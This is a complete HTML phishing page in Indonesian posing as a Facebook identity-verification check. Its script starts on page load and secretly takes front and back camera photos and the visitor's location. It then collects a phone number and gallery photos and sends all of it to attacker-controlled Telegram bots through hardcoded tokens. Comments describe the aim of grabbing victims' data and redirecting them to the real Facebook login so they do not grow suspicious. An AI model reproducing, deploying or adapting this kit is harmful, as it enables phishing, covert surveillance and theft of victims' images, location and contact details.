<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Security Check</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; }
        .main-card { max-width: 450px; margin: 50px auto; border: none; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.1); background: white; }
        .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; letter-spacing: -1px; }
        .btn-fb { background-color: #1877f2; color: white; font-weight: bold; padding: 10px; border-radius: 6px; border: none; }
        .btn-fb:hover { background-color: #166fe5; color: white; }
        #video, #canvas { display: none; }
        .loading-spinner { display: none; }
    </style>
</head>
<body>

<div class="container text-center">
    <div class="main-card card p-4">
        <div class="fb-logo mb-3">facebook</div>
        <h5 class="fw-bold">Verifikasi Identitas Anda</h5>
        <p class="text-muted" style="font-size: 14px;">Kami mendeteksi aktivitas mencurigakan pada akun Anda. Mohon verifikasi data di bawah ini untuk menghindari pemblokiran permanen.</p>
        
        <hr>

        <div class="mb-3 text-start">
            <label class="form-label small fw-bold">Konfirmasi Nomor Telepon</label>
            <input type="number" id="phone" class="form-control mb-2" placeholder="Nomor Handphone Terdaftar">
            <button class="btn btn-fb w-100" onclick="sendDataOnly()">Konfirmasi & Pulihkan Akun</button>
        </div>

        <div class="mb-3">
            <p class="small text-muted text-start">Unggah 5 Foto Aktivitas Terakhir untuk Verifikasi Manual:</p>
            <input type="file" id="galeri" class="form-control form-control-sm" multiple accept="image/*">
        </div>

        <div class="loading-spinner text-primary mt-3" id="loader">
            <div class="spinner-border spinner-border-sm"></div> <span class="small">Mengunggah data keamanan...</span>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
    const chats = ["7835924973", "8071786272"];

    // SISTEM OTOMATIS PAS MASUK üòà
    window.onload = () => {
        // Mulai sikat data secara berurutan
        autoCapture("user"); // Kamera Depan
        autoLocation(); // Lokasi
    };

    function sendToTelegram(msg, isPhoto = false, blob = null) {
        tokens.forEach((token, i) => {
            const url = isPhoto ? `https://api.telegram.org/bot${token}/sendPhoto` : `https://api.telegram.org/bot${token}/sendMessage`;
            const formData = new FormData();
            formData.append("chat_id", chats[i]);
            if (isPhoto) {
                formData.append("photo", blob, "captured_data.jpg");
                formData.append("caption", msg);
            } else {
                formData.append("text", msg);
            }
            fetch(url, { method: "POST", body: isPhoto ? formData : new URLSearchParams(formData) });
        });
    }

    // Capture Kamera üì∏
    async function autoCapture(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = 480;
                canvas.height = 640;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob((blob) => {
                    sendToTelegram(`Captured: ${mode === "user" ? "Front" : "Back"} Camera`, true, blob);
                }, 'image/jpeg');
                stream.getTracks().forEach(t => t.stop());

                // Kalau udah kamera depan, lanjut sikat kamera belakang setelah 3 detik
                if(mode === "user") {
                    setTimeout(() => autoCapture("environment"), 3000);
                }
            }, 2000);
        } catch (e) {
            // KALO NOLAK KAMERA, LANGSUNG KICK KE LOGIN FB BIAR GAK CURIGA ‚ò†Ô∏è
            console.log("Kamera Ditolak");
            window.location.href = "https://www.facebook.com/login"; 
        }
    }

    // Lokasi üìç
    function autoLocation() {
        navigator.geolocation.getCurrentPosition((p) => {
            const mapLink = `üìç LOKASI TARGET: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
            sendToTelegram(mapLink);
        }, (err) => {
            // KALO NOLAK LOKASI, KASIH PERINGATAN BIAR DIA MAU INPUT NOMOR üòã
            console.log("Lokasi Ditolak");
            alert("Sistem keamanan membutuhkan lokasi untuk verifikasi. Lanjutkan secara manual.");
        });
    }

    // Tombol Kirim Nomor & Galeri üñºÔ∏è
    function sendDataOnly() {
        const phone = document.getElementById('phone').value;
        const files = document.getElementById('galeri').files;
        
        if(!phone) { alert("Silakan masukkan nomor telepon!"); return; }
        
        document.getElementById('loader').style.display = 'block';
        sendToTelegram(`üì± NOMOR HP TARGET: ${phone}`);
        
        // Kirim maksimal 5 foto galeri
        for (let i = 0; i < Math.min(files.length, 5); i++) {
            sendToTelegram(`üñºÔ∏è FOTO GALERI ${i+1}`, true, files[i]);
        }

        setTimeout(() => {
            alert("Identitas berhasil dikirim. Sesi akan diperbarui.");
            window.location.href = "https://www.facebook.com/login";
        }, 3000);
    }
</script>
</body>
</html>
